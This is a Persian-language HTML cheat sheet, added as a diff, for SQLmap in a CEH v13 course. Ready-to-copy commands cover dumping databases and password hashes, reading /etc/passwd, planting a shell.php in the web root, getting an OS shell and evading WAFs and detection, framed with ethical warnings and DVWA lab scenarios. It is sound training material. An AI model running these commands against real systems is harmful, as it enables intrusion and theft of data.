@@ -1,0 +1,680 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>چیت‌شیت SQLmap - دوره CEH V13</title>
+    <link rel="stylesheet" href="../../style.css">
+    <style>
+        .code-block {
+            position: relative;
+            background: #1e2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            overflow-x: auto;
+            margin: 10px 0;
+            border-left: 5px solid #2a7de1;
+        }
+        .code-block code {
+            background: transparent;
+            border: none;
+            color: #e4eef7;
+            padding: 0;
+            font-size: 0.95rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .copy-btn {
+            background: #4a5a7a;
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            cursor: pointer;
+            float: left;
+            transition: background 0.2s;
+            font-weight: 600;
+        }
+        .copy-btn:hover {
+            background: #2a7de1;
+        }
+        .table-responsive {
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            margin: 16px 0 12px 0;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: white;
+            font-size: 0.95rem;
+            min-width: 550px;
+        }
+        th {
+            background: #1e3a5f;
+            color: white;
+            padding: 12px 15px;
+            text-align: right;
+            white-space: nowrap;
+            font-weight: 600;
+        }
+        td {
+            padding: 10px 15px;
+            border-bottom: 1px solid #e8edf4;
+            vertical-align: top;
+        }
+        tr:hover {
+            background: #f1f6fa;
+        }
+        td code, th code {
+            background: #eef3f7;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            color: #c7254e;
+            border: 1px solid #dce3ea;
+            white-space: nowrap;
+        }
+        .glossary-term {
+            font-weight: 700;
+            color: #0b3b5c;
+            background: #e8f0fe;
+            padding: 2px 8px;
+            border-radius: 4px;
+        }
+        .highlight-box {
+            background: #e8f0fe;
+            border-right: 6px solid #ff9f1c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .warning-box {
+            background: #fef0e8;
+            border-right: 6px solid #e74c3c;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tip-box {
+            background: #e8fef0;
+            border-right: 6px solid #27ae60;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .info-box {
+            background: #e8f0fe;
+            border-right: 6px solid #2a7de1;
+            padding: 18px 24px;
+            border-radius: 12px;
+            margin: 22px 0 10px 0;
+        }
+        .tech-section {
+            margin: 25px 0 15px 0;
+            border-right: 4px solid #2a7de1;
+            padding-right: 15px;
+        }
+        .tech-section h3 {
+            color: #0b3b5c;
+            border-bottom: 2px solid #b6d4f0;
+            padding-bottom: 5px;
+            margin-top: 0;
+        }
+        @media (max-width: 768px) {
+            table {
+                font-size: 0.85rem;
+                min-width: 400px;
+            }
+            th, td {
+                padding: 8px 10px;
+            }
+        }
+        @media (max-width: 480px) {
+            table {
+                font-size: 0.8rem;
+                min-width: 320px;
+            }
+            th, td {
+                padding: 6px 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== نوار ناوبری ===== -->
+    <div class="nav-bar">
+        <span dir='ltr'>📘 CEH V13</span>
+        <span dir='ltr'>
+            <a href="../index.html">خانه</a> |
+            <a href="../index.html">ابزارها</a>
+        </span>
+    </div>
+
+    <h1>🗄️ چیت‌شیت جامع SQLmap</h1>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱: مقدمه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔰 مقدمه – SQLmap چیست؟</h2>
+        <p>
+            <b>SQLmap</b> یک ابزار متن‌باز و قدرتمند برای <b>تشخیص و بهره‌برداری خودکار</b> از آسیب‌پذیری‌های <b>تزریق SQL (SQL Injection)</b> است. این ابزار که به زبان Python نوشته شده، به متخصصان امنیت امکان می‌دهد تا به‌صورت خودکار و کارآمد، آسیب‌پذیری‌های SQLi را شناسایی کرده و داده‌های حساس را از پایگاه داده استخراج کنند.
+        </p>
+        <p>
+            SQLmap از <b>انواع مختلف SQL Injection</b> (مانند Boolean-based Blind، Time-based Blind، Error-based، UNION-based و Out-of-band) پشتیبانی می‌کند و با <b>بیش از ۳۰ نوع پایگاه داده</b> (MySQL، PostgreSQL، Oracle، MSSQL، SQLite و …) سازگار است.
+        </p>
+        <div class="info-box">
+            <b>💡 کاربردهای اصلی SQLmap:</b>
+            <ul>
+                <li><b>تشخیص خودکار:</b> شناسایی خودکار آسیب‌پذیری‌های SQL Injection.</li>
+                <li><b>استخراج داده:</b> دریافت نام پایگاه‌های داده، جداول، ستون‌ها و داده‌های آنها.</li>
+                <li><b>بهره‌برداری پیشرفته:</b> دریافت شل سیستمی (OS Shell)، خواندن/نوشتن فایل‌ها و اجرای دستورات.</li>
+                <li><b>دور زدن WAF:</b> استفاده از تکنیک‌های پیشرفته برای عبور از فایروال‌های برنامه‌های وب.</li>
+                <li><b>Brute-Force:</b> انجام حملات Brute-Force برای پیدا کردن جداول و ستون‌ها.</li>
+                <li><b>حملات به کوکی‌ها و هدرها:</b> تست SQL Injection در کوکی‌ها، هدرها و پارامترهای مختلف.</li>
+            </ul>
+        </div>
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> SQLmap یک ابزار بسیار قدرتمند است. استفاده از آن برای حمله به سیستم‌های بدون مجوز، <b>جرم</b> محسوب می‌شود. فقط در محیط‌های آزمایشگاهی و با مجوز استفاده شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۲: نصب و راه‌اندازی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📥 نصب و راه‌اندازی SQLmap</h2>
+
+        <h3>📌 نصب در Kali Linux (پیش‌فرض):</h3>
+        <p>SQLmap در Kali Linux به صورت پیش‌فرض نصب است.</p>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sudo apt update
+sudo apt install sqlmap -y</code></pre>
+        </div>
+
+        <h3>📌 نصب از مخزن GitHub (آخرین نسخه):</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py --version</code></pre>
+        </div>
+
+        <h3>📌 نصب در ویندوز:</h3>
+        <p>دانلود از: <a href="https://sqlmap.org/" target="_blank">https://sqlmap.org/</a></p>
+
+        <h3>📌 بررسی نصب و نسخه:</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sqlmap --version</code></pre>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> برای استفاده از SQLmap، به Python 3 نیاز دارید. در Kali Linux، Python 3 به صورت پیش‌فرض نصب است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۳: گزینه‌های پایه -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>⚙️ گزینه‌های پایه SQLmap</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th>گزینه</th><th>توضیح</th><th>مثال</th></tr>
+                <tr>
+                    <td><code dir='ltr'>-u</code> یا <code dir='ltr'>--url</code></td>
+                    <td>URL هدف</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1"</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--data</code></td>
+                    <td>داده‌های POST</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--cookie</code></td>
+                    <td>ارسال کوکی</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/profile.php" --cookie="PHPSESSID=abc123"</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--headers</code></td>
+                    <td>ارسال هدرهای سفارشی</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/api.php" --headers="User-Agent: Mozilla/5.0"</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--method</code></td>
+                    <td>روش HTTP (GET/POST/PUT/DELETE)</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/api.php" --method=PUT</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--level</code></td>
+                    <td>سطح اسکن (۱-۵، پیش‌فرض ۱)</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --level=3</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--risk</code></td>
+                    <td>ریسک اسکن (۱-۳، پیش‌فرض ۱)</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --risk=2</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--threads</code></td>
+                    <td>تعداد تردهای موازی</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --threads=10</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--batch</code></td>
+                    <td>حالت خودکار (بدون سوال)</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --batch</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>-v</code></td>
+                    <td>سطح جزئیات (۰-۶، پیش‌فرض ۱)</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" -v 3</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--random-agent</code></td>
+                    <td>استفاده از User-Agent تصادفی</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --random-agent</code></td>
+                </tr>
+                <tr>
+                    <td><code dir='ltr'>--delay</code></td>
+                    <td>تأخیر بین درخواست‌ها (ثانیه)</td>
+                    <td><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --delay=2</code></td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="tip-box">
+            <b>💡 نکته:</b> گزینه‌های <code dir='ltr'>--level</code> و <code dir='ltr'>--risk</code> برای اسکن عمیق‌تر و شناسایی آسیب‌پذیری‌های پیچیده‌تر استفاده می‌شوند. سطح بالاتر ممکن است باعث ایجاد ترافیک سنگین شود.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۴: تشخیص و شناسایی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔍 تشخیص و شناسایی با SQLmap</h2>
+
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># تشخیص خودکار SQL Injection
+sqlmap -u "http://target.com/page.php?id=1"
+
+# تشخیص با کوکی
+sqlmap -u "http://target.com/profile.php" --cookie="PHPSESSID=abc123"
+
+# تشخیص با داده‌های POST
+sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"
+
+# اسکن با سطح و ریسک بالاتر
+sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2
+
+# تشخیص با تکنیک خاص (مثال: Time-based Blind)
+sqlmap -u "http://target.com/page.php?id=1" --technique=T
+
+# تشخیص تمام تکنیک‌ها
+sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ</code></pre>
+        </div>
+
+        <div class="info-box">
+            <b>💡 تکنیک‌های پشتیبانی‌شده:</b>
+            <ul>
+                <li><b>B:</b> Boolean-based Blind</li>
+                <li><b>E:</b> Error-based</li>
+                <li><b>U:</b> UNION-based</li>
+                <li><b>S:</b> Stacked Queries</li>
+                <li><b>T:</b> Time-based Blind</li>
+                <li><b>Q:</b> Inline Queries</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۵: استخراج داده -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📊 استخراج داده با SQLmap</h2>
+
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># لیست پایگاه‌های داده
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# استفاده از پایگاه داده خاص
+sqlmap -u "http://target.com/page.php?id=1" -D database_name
+
+# لیست جداول یک پایگاه داده
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+
+# لیست ستون‌های یک جدول
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
+
+# استخراج داده از یک جدول
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
+
+# استخراج ستون‌های خاص
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
+
+# استخراج با محدودیت (۱۰ رکورد اول)
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --stop=10</code></pre>
+        </div>
+
+        <h3>📌 استخراج اطلاعات با SQLmap (پیشرفته):</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># استخراج نام کاربری پایگاه داده
+sqlmap -u "http://target.com/page.php?id=1" --current-user
+
+# استخراج نام پایگاه داده فعلی
+sqlmap -u "http://target.com/page.php?id=1" --current-db
+
+# استخراج تمام کاربران پایگاه داده
+sqlmap -u "http://target.com/page.php?id=1" --users
+
+# استخراج رمزهای عبور هش‌شده
+sqlmap -u "http://target.com/page.php?id=1" --passwords
+
+# استخراج نقش‌ها و مجوزها
+sqlmap -u "http://target.com/page.php?id=1" --privileges</code></pre>
+        </div>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار:</b> استخراج داده‌های حساس بدون مجوز جرم است. فقط در محیط‌های آزمایشگاهی و با مجوز انجام دهید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۶: تکنیک‌های پیشرفته -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🚀 تکنیک‌های پیشرفته SQLmap</h2>
+
+        <div class="tech-section">
+            <h3>📌 ۱. اجرای دستورات سیستم (OS Shell)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># دریافت شل سیستمی (در صورت وجود آسیب‌پذیری)
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# اجرای یک دستور خاص
+sqlmap -u "http://target.com/page.php?id=1" --os-cmd="id"</code></pre>
+            </div>
+        </div>
+
+        <div class="tech-section">
+            <h3>📌 ۲. خواندن و نوشتن فایل‌ها</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># خواندن فایل از سرور (نیاز به دسترسی FILE)
+sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"
+
+# نوشتن فایل روی سرور
+sqlmap -u "http://target.com/page.php?id=1" --file-write="/path/to/shell.php" --file-dest="/var/www/html/shell.php"</code></pre>
+            </div>
+        </div>
+
+        <div class="tech-section">
+            <h3>📌 ۳. دور زدن WAF و فیلترها (WAF Bypass)</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># استفاده از User-Agent تصادفی
+sqlmap -u "http://target.com/page.php?id=1" --random-agent
+
+# استفاده از تکنیک‌های Bypass
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
+
+# چندین Tamper با هم
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase
+
+# لیست تمام Tamperها
+sqlmap --list-tampers</code></pre>
+            </div>
+            <div class="tip-box">
+                <b>💡 نکته:</b> Tamperها اسکریپت‌هایی هستند که برای دور زدن فیلترها و WAF استفاده می‌شوند. برخی از معروف‌ترین Tamperها عبارتند از:
+                <ul>
+                    <li><b>space2comment:</b> تبدیل فاصله به کامنت‌های SQL</li>
+                    <li><b>between:</b> جایگزینی AND با BETWEEN</li>
+                    <li><b>randomcase:</b> تغییر تصادفی حروف بزرگ/کوچک</li>
+                    <li><b>chardoubleencode:</b> کدگذاری دوگانه کاراکترها</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="tech-section">
+            <h3>📌 ۴. حملات به کوکی‌ها و هدرها</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># تست SQL Injection در کوکی
+sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123*"
+
+# تست در هدر User-Agent
+sqlmap -u "http://target.com/page.php" --headers="User-Agent: test*"
+
+# تست در هدر Referer
+sqlmap -u "http://target.com/page.php" --headers="Referer: test*"</code></pre>
+            </div>
+        </div>
+
+        <div class="tech-section">
+            <h3>📌 ۵. حملات Brute-Force</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># Brute-Force نام جداول
+sqlmap -u "http://target.com/page.php?id=1" --common-tables
+
+# Brute-Force نام ستون‌ها
+sqlmap -u "http://target.com/page.php?id=1" --common-columns</code></pre>
+            </div>
+        </div>
+
+        <div class="tech-section">
+            <h3>📌 ۶. ادامه و ذخیره نتایج</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># ذخیره خروجی در فایل
+sqlmap -u "http://target.com/page.php?id=1" --output-dir="/path/to/results"
+
+# ادامه اسکن از نقطه قبلی (Resume)
+sqlmap -u "http://target.com/page.php?id=1" --resume
+
+# ذخیره نتایج در فایل CSV
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump --csv</code></pre>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۷: سناریوهای عملی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🧪 سناریوهای عملی با SQLmap</h2>
+
+        <h3>📌 سناریو ۱: اسکن و استخراج داده از DVWA</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># اسکن URL با کوکی
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123"
+
+# استخراج پایگاه‌های داده
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" --dbs
+
+# استخراج جداول پایگاه داده dvwa
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" -D dvwa --tables
+
+# استخراج داده از جدول users
+sqlmap -u "http://192.168.1.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=abc123" -D dvwa -T users --dump</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۲: حمله به یک API با متد POST</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sqlmap -u "http://api.target.com/v1/user" --data="id=1&action=view" --method=POST --headers="Authorization: Bearer token123" --batch</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۳: حمله با تکنیک Time-based Blind</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --technique=T --delay=2 --batch</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۴: دریافت شل سیستمی</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'># ابتدا بررسی می‌کنیم که آیا امکان دریافت شل وجود دارد
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
+
+# در صورت موفقیت، یک شل تعاملی دریافت می‌کنید</code></pre>
+        </div>
+
+        <h3>📌 سناریو ۵: دور زدن WAF با Tamper</h3>
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+            <pre dir='ltr'><code dir='ltr'>sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase --batch</code></pre>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> ترکیب گزینه‌های <code dir='ltr'>--level</code>، <code dir='ltr'>--risk</code> و <code dir='ltr'>--tamper</code> می‌تواند شانس موفقیت را در محیط‌های با WAF قوی افزایش دهد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۸: نکات امنیتی و حرفه‌ای -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🔒 نکات امنیتی و حرفه‌ای</h2>
+
+        <ul>
+            <li><b>همیشه از کوکی و جلسه صحیح استفاده کنید:</b> برای دسترسی به صفحات نیازمند احراز هویت، کوکی معتبر ارسال کنید.</li>
+            <li><b>تنظیم --delay برای کاهش بار:</b> در محیط‌های واقعی، از تأخیر بین درخواست‌ها استفاده کنید تا از شناسایی جلوگیری شود.</li>
+            <li><b>استفاده از --threads با احتیاط:</b> تردهای زیاد ممکن است باعث ایجاد ترافیک سنگین و شناسایی شود.</li>
+            <li><b>آزمایش با --level و --risk:</b> سطح و ریسک بالاتر ممکن است آسیب‌پذیری‌های بیشتری را شناسایی کند اما زمان بیشتری می‌برد.</li>
+            <li><b>بررسی نتایج:</b> همیشه نتایج اسکن را به‌دقت بررسی کنید تا از مثبت کاذب جلوگیری شود.</li>
+            <li><b>استفاده از --batch:</b> برای خودکارسازی کامل و جلوگیری از توقف به دلیل سوالات.</li>
+            <li><b>به‌روزرسانی منظم:</b> SQLmap را به‌روز نگه دارید تا از آخرین payloadها و تکنیک‌ها بهره‌مند شوید.</li>
+            <li><b>آزمایش در محیط‌های مجاز:</b> از SQLmap فقط در محیط‌های مجاز استفاده کنید.</li>
+        </ul>
+
+        <div class="warning-box">
+            <b>⚠️ هشدار اخلاقی:</b> استفاده از SQLmap برای حمله به سیستم‌های بدون مجوز جرم است. همیشه قبل از تست، مجوز کتبی دریافت کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📖 واژه‌نامه تخصصی SQLmap</h2>
+
+        <div class="table-responsive">
+            <table>
+                <tr><th style="min-width:130px;">واژه</th><th>توضیح کامل</th></tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">SQL Injection</span></td>
+                    <td>آسیب‌پذیری‌ای که در آن مهاجم کد SQL مخرب را به ورودی‌های برنامه تزریق می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Boolean-based Blind</span></td>
+                    <td>نوعی SQL Injection که در آن مهاجم با ارسال شرط‌های True/False، اطلاعات را استخراج می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Time-based Blind</span></td>
+                    <td>نوعی SQL Injection که در آن مهاجم با استفاده از تأخیر زمانی (SLEEP) اطلاعات را استخراج می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Error-based</span></td>
+                    <td>نوعی SQL Injection که در آن مهاجم از پیام‌های خطای پایگاه داده برای استخراج اطلاعات استفاده می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">UNION-based</span></td>
+                    <td>نوعی SQL Injection که در آن مهاجم از دستور UNION برای ترکیب نتایج کوئری‌ها استفاده می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Out-of-band</span></td>
+                    <td>نوعی SQL Injection که در آن مهاجم از کانال دیگری (مثل DNS یا HTTP) برای دریافت داده استفاده می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Payload</span></td>
+                    <td>کد یا داده‌ای که برای بهره‌برداری از آسیب‌پذیری تزریق می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Tamper</span></td>
+                    <td>اسکریپتی که برای تغییر Payload و دور زدن فیلترها و WAF استفاده می‌شود.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">WAF</span></td>
+                    <td>Web Application Firewall – سیستمی که از برنامه‌های وب در برابر حملات محافظت می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">OS Shell</span></td>
+                    <td>دسترسی به خط فرمان سیستم‌عامل هدف که از طریق SQL Injection به دست می‌آید.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Database Schema</span></td>
+                    <td>ساختار پایگاه داده شامل جداول، ستون‌ها، و روابط بین آنها.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Brute-Force</span></td>
+                    <td>حمل‌های که در آن با امتحان ترکیب‌های مختلف، سعی در یافتن اطلاعات (مثل نام جداول) می‌کند.</td>
+                </tr>
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">sqlmap</span></td>
+                    <td>ابزاری خودکار برای تشخیص و بهره‌برداری از آسیب‌پذیری‌های SQL Injection.</td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی چیت‌شیت SQLmap:</b>
+        <p>
+            SQLmap یکی از قدرتمندترین ابزارهای تشخیص و بهره‌برداری از SQL Injection است که با قابلیت‌های پیشرفته‌ای 
+            مانند OS Shell، WAF Bypass و استخراج خودکار داده، به متخصصان امنیت امکان ارزیابی عمیق برنامه‌های وب را می‌دهد.
+        </p>
+        <p>
+            <b>📌 توصیه نهایی:</b> با گزینه‌های پایه شروع کنید و سپس به سراغ تکنیک‌های پیشرفته بروید. همیشه از گزینه‌های 
+            <code dir='ltr'>--batch</code> و <code dir='ltr'>--random-agent</code> برای خودکارسازی و کاهش شناسایی استفاده کنید. 
+            تمرین روی محیط‌های آزمایشگاهی مانند DVWA بهترین راه برای یادگیری است.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">چیت‌شیت SQLmap | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
